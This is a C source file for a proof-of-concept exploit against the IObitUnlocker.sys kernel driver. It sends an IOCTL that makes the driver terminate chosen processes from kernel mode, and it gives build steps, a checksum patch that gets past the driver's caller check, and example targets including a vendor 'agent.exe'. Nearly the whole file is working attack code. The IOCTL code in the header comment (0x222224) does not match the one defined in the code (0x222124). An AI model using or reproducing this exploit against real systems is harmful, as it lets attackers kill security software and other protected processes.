/*
 * PoC: IObitUnlocker.sys arbitrary process termination
 * Driver: IOBit Unlocker kernel driver
 * Device: \\.\IObitUnlockerDevice (world-accessible, METHOD_BUFFERED)
 *
 * IOCTL 0x222224 accepts a file/module path and flags. The driver
 * enumerates all processes that have the specified module loaded,
 * then calls ZwTerminateProcess from kernel mode to kill each one,
 * bypassing usermode access checks.
 *
 * Caller validation: the driver reads the calling process's EXE file,
 * computes two checksums over its bytes, and rejects the IOCTL unless
 * they match hardcoded values. Use patch_checksum.py after compilation
 * to patch the binary so the checksums pass.
 *
 * Blocklisted (driver refuses to kill):
 *   IObitUnlocker.exe, System, csrss.exe, lsass.exe, lsm.exe,
 *   smss.exe, System Idle Process, wininit.exe, winlogon.exe,
 *   userinit.exe
 * Special: explorer.exe sets a flag but is still killed.
 *
 * Input buffer layout (METHOD_BUFFERED, IOCTL 0x222224):
 *   Offset 0x000: WCHAR[264] - target module/file path (null-terminated)
 *   Offset 0x210: WCHAR[264] - optional destination path (for move/rename)
 *   Offset 0x420: DWORD      - operation mode (0 for kill-only)
 *   Offset 0x424: DWORD      - flags bitmask:
 *                                 2 = kill processes by loaded module
 *                                 4 = close file handles + kill
 *                                 6 = both
 *
 * Build (MinGW):  x86_64-w64-mingw32-gcc poc_iobitunlocker.c -o poc_iobitunlocker.exe -lkernel32
 * Build (MSVC):   cl.exe poc_iobitunlocker.c /Fe:poc_iobitunlocker.exe
 * Post-build:     python3 patch_checksum.py poc_iobitunlocker.exe
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define IOCTL_UNLOCK 0x222124
#define DEVICE_PATH L"\\\\.\\IObitUnlockerDevice"

#pragma pack(push, 1)
typedef struct _UNLOCK_INPUT {
    WCHAR  FilePath[264];       /* 0x000: target module path */
    WCHAR  DestPath[264];       /* 0x210: destination (unused for kill) */
    DWORD  OpMode;              /* 0x420: operation mode */
    DWORD  Flags;               /* 0x424: 2=kill, 4=close+kill, 6=both */
} UNLOCK_INPUT;
#pragma pack(pop)

static void usage(const wchar_t *prog)
{
    wprintf(L"\n");
    wprintf(L"  IObitUnlocker.sys - Arbitrary Process Termination PoC\n");
    wprintf(L"  =====================================================\n\n");
    wprintf(L"  Exploits IOCTL 0x222224 on \\\\.\\.\\IObitUnlockerDevice to\n");
    wprintf(L"  kill processes via ZwTerminateProcess from kernel mode.\n\n");
    wprintf(L"  USAGE:\n\n");
    wprintf(L"    %ls -p <pid> [-f <flags>]     Kill process by PID\n", prog);
    wprintf(L"    %ls <module_path> [flags]      Kill by module path\n", prog);
    wprintf(L"    %ls -h                         Show this help\n\n", prog);
    wprintf(L"  OPTIONS:\n\n");
    wprintf(L"    -p, --pid <pid>      Target process ID. The image path is\n");
    wprintf(L"                         resolved automatically. NOTE: all\n");
    wprintf(L"                         processes sharing that image are killed.\n");
    wprintf(L"    -f, --flags <flags>  IOCTL flags (default: 2)\n");
    wprintf(L"                           2 = kill by loaded module\n");
    wprintf(L"                           4 = close file handles + kill\n");
    wprintf(L"                           6 = both\n");
    wprintf(L"    -h, --help           Show this help message\n\n");
    wprintf(L"  EXAMPLES:\n\n");
    wprintf(L"    %ls --pid 960\n", prog);
    wprintf(L"    %ls -p 1234 -f 4\n", prog);
    wprintf(L"    %ls C:\\Windows\\System32\\notepad.exe\n", prog);
    wprintf(L"    %ls \"C:\\Program Files\\Vendor\\agent.exe\" 4\n\n", prog);
    wprintf(L"  PREREQUISITES:\n\n");
    wprintf(L"    - Admin privileges (to open the device)\n");
    wprintf(L"    - IObitUnlocker driver loaded\n");
    wprintf(L"    - Binary patched with patch_checksum.py\n\n");
    wprintf(L"  BLOCKLISTED (driver refuses to kill):\n\n");
    wprintf(L"    System, csrss.exe, lsass.exe, lsm.exe, smss.exe,\n");
    wprintf(L"    wininit.exe, winlogon.exe, userinit.exe,\n");
    wprintf(L"    System Idle Process, IObitUnlocker.exe\n\n");
}

static int resolve_pid_to_path(DWORD pid, WCHAR *out, DWORD out_chars)
{
    HANDLE hProc;
    DWORD size;

    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProc == NULL) {
        wprintf(L"[-] OpenProcess(%lu) failed: 0x%08lx\n",
                (unsigned long)pid, GetLastError());
        return 0;
    }

    size = out_chars;
    if (!QueryFullProcessImageNameW(hProc, 0, out, &size)) {
        wprintf(L"[-] QueryFullProcessImageName(%lu) failed: 0x%08lx\n",
                (unsigned long)pid, GetLastError());
        CloseHandle(hProc);
        return 0;
    }

    CloseHandle(hProc);
    return 1;
}

static int send_kill_ioctl(const WCHAR *module_path, DWORD flags)
{
    HANDLE hDevice;
    UNLOCK_INPUT input;
    DWORD bytesReturned;
    DWORD outBuf = 0;

    hDevice = CreateFileW(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
                          0, NULL, OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] CreateFile failed: 0x%08lx\n", GetLastError());
        wprintf(L"    Is IObitUnlocker installed? Running as admin?\n");
        return 0;
    }
    wprintf(L"[+] Opened %ls\n", DEVICE_PATH);

    memset(&input, 0, sizeof(input));
    wcsncpy(input.FilePath, module_path, 263);
    input.FilePath[263] = L'\0';
    input.OpMode = 0;
    input.Flags = flags;

    wprintf(L"[*] Target : %ls\n", input.FilePath);
    wprintf(L"[*] IOCTL  : 0x%08X\n", IOCTL_UNLOCK);
    wprintf(L"[*] Flags  : 0x%X\n", flags);
    wprintf(L"[*] BufSize: %u bytes\n", (unsigned)sizeof(input));
    wprintf(L"[*] Sending IOCTL...\n");

    if (!DeviceIoControl(hDevice, IOCTL_UNLOCK,
                         &input, sizeof(input),
                         &outBuf, sizeof(outBuf),
                         &bytesReturned, NULL)) {
        wprintf(L"[-] DeviceIoControl failed: 0x%08lx\n", GetLastError());
        CloseHandle(hDevice);
        return 0;
    }

    wprintf(L"[+] IOCTL returned successfully  (out=0x%08lx, bytes=%lu)\n",
            (unsigned long)outBuf, (unsigned long)bytesReturned);
    wprintf(L"[+] All non-blocklisted processes loading\n");
    wprintf(L"    '%ls' have been terminated.\n", input.FilePath);

    CloseHandle(hDevice);
    return 1;
}

int wmain(int argc, wchar_t *argv[])
{
    DWORD pid = 0;
    DWORD flags = 2;
    const WCHAR *module_path = NULL;
    WCHAR resolved_path[MAX_PATH];
    int i;

    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    for (i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"-h") == 0 || wcscmp(argv[i], L"--help") == 0) {
            usage(argv[0]);
            return 0;
        } else if (wcscmp(argv[i], L"-p") == 0 || wcscmp(argv[i], L"--pid") == 0) {
            if (i + 1 >= argc) {
                wprintf(L"[-] %ls requires a PID argument\n", argv[i]);
                return 1;
            }
            pid = (DWORD)wcstoul(argv[++i], NULL, 10);
        } else if (wcscmp(argv[i], L"-f") == 0 || wcscmp(argv[i], L"--flags") == 0) {
            if (i + 1 >= argc) {
                wprintf(L"[-] %ls requires a flags argument\n", argv[i]);
                return 1;
            }
            flags = (DWORD)wcstoul(argv[++i], NULL, 0);
        } else if (module_path == NULL) {
            module_path = argv[i];
            if (i + 1 < argc && argv[i + 1][0] != L'-') {
                flags = (DWORD)wcstoul(argv[++i], NULL, 0);
            }
        } else {
            wprintf(L"[-] Unknown argument: %ls\n", argv[i]);
            return 1;
        }
    }

    if (pid == 0 && module_path == NULL) {
        wprintf(L"[-] Specify --pid <pid> or a module path. Use -h for help.\n");
        return 1;
    }

    if (pid != 0 && module_path != NULL) {
        wprintf(L"[-] Specify either --pid or a module path, not both.\n");
        return 1;
    }

    wprintf(L"\n  IObitUnlocker.sys - Arbitrary Process Kill PoC\n\n");

    if (pid != 0) {
        wprintf(L"[*] Resolving PID %lu to image path...\n", (unsigned long)pid);
        if (!resolve_pid_to_path(pid, resolved_path, MAX_PATH)) {
            return 1;
        }
        wprintf(L"[+] PID %lu -> %ls\n", (unsigned long)pid, resolved_path);
        wprintf(L"[!] WARNING: all processes sharing this image will be killed.\n");
        module_path = resolved_path;
    }

    return send_kill_ioctl(module_path, flags) ? 0 : 1;
}
